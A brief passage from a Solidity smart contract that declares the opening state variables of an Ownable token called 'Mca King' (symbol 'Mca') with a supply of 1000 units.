...
contract McaTOKEN is Ownable {
    address public koken600;
    uint256 supplyamount = 1000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Mca King";
    string private _cctokensymbol = "Mca";
